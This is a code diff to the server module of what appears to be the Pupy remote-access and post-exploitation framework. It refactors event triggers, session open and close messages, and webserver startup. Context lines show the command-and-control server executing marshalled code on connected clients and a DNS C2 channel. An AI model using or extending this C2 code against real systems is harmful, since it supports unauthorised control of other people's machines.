@@ -36,8 +36,9 @@ from pupylib.PupyCompile import pupycompile
 from pupylib.PupyOutput import Error, Line, Color
 from pupylib.PupyModule import QA_STABLE, IgnoreModule
 from pupylib.PupyDnsCnc import PupyDnsCnc
-from pupylib.PupyTriggers import event
+from pupylib.PupyTriggers import event, event_to_string, register_event_id, CUSTOM
 from pupylib.PupyTriggers import ON_CONNECT, ON_DISCONNECT, ON_START, ON_EXIT
+from pupylib.PupyTriggers import RegistrationNotAllowed, UnregisteredEventId
 from pupylib.PupyWeb import PupyWebServer
 from pupylib.PupyOffload import PupyOffloadManager, OffloadProxyCommonError
 
@@ -60,6 +61,8 @@ from network.lib.base import chain_transports
 from network.lib.transports.httpwrap import PupyHTTPWrapperServer
 from network.lib.igd import IGDClient, UPNPError
 from network.lib.streams.PupySocketStream import PupyChannel
+
+from triggers import Triggers
 
 from . import getLogger
 logger = getLogger('server')
@@ -357,6 +360,7 @@ class PupyServer(object):
         self.ipv6 = self.config.getboolean('pupyd', 'ipv6')
         self.handler = None
         self.handler_registered = Event()
+        self.triggers = Triggers()
         self.categories = PupyCategories(self)
         self.igd = None
         self.finished = Event()
@@ -438,6 +442,7 @@ class PupyServer(object):
                     listeners=self.get_listeners,
                     cmdhandler=self.handler,
                     pproxy=pproxy_dnscnc,
+                    server=self
                 )
             except Exception, e:
                 logger.error('DnsCNC failed: %s', e)
@@ -461,16 +466,19 @@ class PupyServer(object):
         for listener in self.listeners.values():
             return listener.port
 
-    def start_webserver(self):
+    def start_webserver(self, motd=False):
         if not self.config.getboolean('pupyd', 'webserver'):
             return False
 
         if not self.pupweb:
             self.pupweb = PupyWebServer(self, self.config)
             self.pupweb.start()
-            self.handler.display_success('WebServer started')
+            self.display('WebServer started ({}:{}, webroot={})'.format(
+                self.pupweb.hostname, self.pupweb.port, self.pupweb.wwwroot),
+                motd=motd)
         else:
-            self.handler.display_error('WebServer already started')
+            self.display(
+                'WebServer already started', error=True, motd=motd)
 
         return True
 
@@ -526,7 +534,7 @@ class PupyServer(object):
 
         self.handler_registered.set()
 
-        event(ON_START, None, self, self.handler, self.config)
+        event(ON_START, None, self)
 
     def _whitelist(self, nodeid, cid):
         if not self.config.getboolean('pupyd', 'whitelist'):
@@ -551,7 +559,7 @@ class PupyServer(object):
         return nodeid in set([x.strip().lower() for x in allowed_nodes.split(',')])
 
     def add_client(self, conn):
-        pc = None
+        client = None
 
         conn.execute(
             'import marshal;exec marshal.loads({})'.format(
@@ -603,8 +611,8 @@ class PupyServer(object):
 
             client_info.update(uuid)
 
-            pc = PupyClient(client_info, self)
-            self.clients.append(pc)
+            client = PupyClient(client_info, self)
+            self.clients.append(client)
 
             if self.handler:
                 try:
@@ -621,20 +629,22 @@ class PupyServer(object):
                 if type(user) == unicode:
                     user = user.encode('utf-8')
 
-                hostname = client_info.get('hostname','?')
-                if type(hostname) == unicode:
-                    hostname = hostname.encode('utf-8')
+                user_info = user
+                if '\\' not in user:
+                    hostname = client_info.get('hostname','?')
+                    if type(hostname) == unicode:
+                        hostname = hostname.encode('utf-8')
 
-                self.handler.display_srvinfo('Session {} opened ({}@{}){}'.format(
-                    client_id, user, hostname, remote if client_port != 0 else '')
+                    user_info = user_info + '@' + hostname
+
+                self.info('Session {} opened ({}){}'.format(
+                    client_id, user_info, remote if client_port != 0 else '')
                 )
 
-        if pc and self.handler:
-            event(ON_CONNECT, pc, self, self.handler, self.config)
+        if client and self.handler:
+            event(ON_CONNECT, client, self, **client.desc)
 
     def remove_client(self, conn):
-        event(ON_DISCONNECT, None, self, self.handler, self.config)
-
         with self.clients_lock:
             client = [x for x in self.clients if (x.conn is conn or x is conn)]
             if not client:
@@ -643,11 +653,12 @@ class PupyServer(object):
 
             client = client[0]
 
+            event(ON_DISCONNECT, client, self, **client.desc)
+
             self.clients.remove(client)
             self.free_id(client.desc['id'])
 
-            if self.handler:
-                self.handler.display_srvinfo('Session {} closed'.format(client.desc['id']))
+            self.info('Session {} closed'.format(client.desc['id']))
 
     def get_clients(self, search_criteria):
         """ return a list of clients corresponding to the search criteria. ex: platform:*win* """
@@ -812,10 +823,8 @@ class PupyServer(object):
                     Color(modname, 'yellow'),
                     'at ({}): {}. Traceback:\n{}'.format(
                     modpath, e, tb))
-                if self.handler:
-                    self.handler.display_srvinfo(error)
-                else:
-                    self.motd['fail'].append(error)
+
+                self.info(error, error=True)
 
     def get_module(self, name):
         enable_dangerous_modules = self.config.getboolean('pupyd', 'enable_dangerous_modules')
@@ -829,10 +838,36 @@ class PupyServer(object):
         module = self.modules[name]
         class_name = None
 
-        if hasattr(module, "__class_name__"):
+        if hasattr(module, '__class_name__'):
             class_name = module.__class_name__
             if not hasattr(module, class_name):
-                logger.error("script %s has a class_name=\"%s\" global variable defined but this class does not exists in the script !"%(name,class_name))
+                logger.error(
+                    'script %s has a class_name="%s" global variable '
+                    'defined but this class does not exists in the script!',
+                    name, class_name)
+
+        if hasattr(module, '__events__'):
+            for event_id, event_name in module.__events__.iteritems():
+                try:
+                    registered_event_name = event_to_string(event_id)
+                    if registered_event_name != event_name:
+                        logger.error(
+                            'script "%s" registers event_id %08x as "%s", '
+                            'but it is already registered as "%s"',
+                            name, event_name, registered_event_name)
+
+                        raise PupyModuleDisabled('Modules with errors are disabled.')
+
+                except UnregisteredEventId:
+                    try:
+                        register_event_id(event_id, event_name)
+                    except RegistrationNotAllowed:
+                        logger.error(
+                            'script "%s" registers event_id 0x%08x which is not allowed, '
+                            'eventid should be >0x%08x',
+                            name, event_id, CUSTOM)
+
+                        raise PupyModuleDisabled('Modules with errors are disabled.')
 
         if not class_name:
             #TODO automatically search the class name in the file
@@ -941,6 +976,7 @@ class PupyServer(object):
 
     def start(self):
         self.handler_registered.wait()
+        self.start_webserver(motd=True)
 
         listeners = set([
             x.strip() for x in (
@@ -1035,7 +1071,10 @@ class PupyServer(object):
         if error:
             del self.listeners[name]
 
-        if motd:
+        self.display(message, error, motd)
+
+    def display(self, message, error=False, motd=False):
+        if motd or not self.handler:
             if error:
                 self.motd['fail'].append(error)
             else:
@@ -1045,6 +1084,14 @@ class PupyServer(object):
                 self.handler.display_error(error)
             else:
                 self.handler.display_success(message)
+
+    def info(self, message, error=False):
+        if self.handler:
+            self.handler.display_srvinfo(message)
+        elif error:
+            self.motd['fail'].append(message)
+        else:
+            self.motd['ok'].append(message)
 
     def remove_listener(self, name):
         if name not in self.listeners:
@@ -1072,7 +1119,7 @@ class PupyServer(object):
         else:
             self.finishing.set()
 
-        event(ON_EXIT, None, self, self.handler, self.config)
+        event(ON_EXIT, None, self)
 
         for cleanup in self._cleanups:
             cleanup()
@@ -1081,5 +1128,9 @@ class PupyServer(object):
 
         for name in self.listeners.keys():
             self.remove_listener(name)
+
+        if self.pupweb:
+            self.pupweb.stop()
+            self.pupweb = None
 
         self.finished.set()
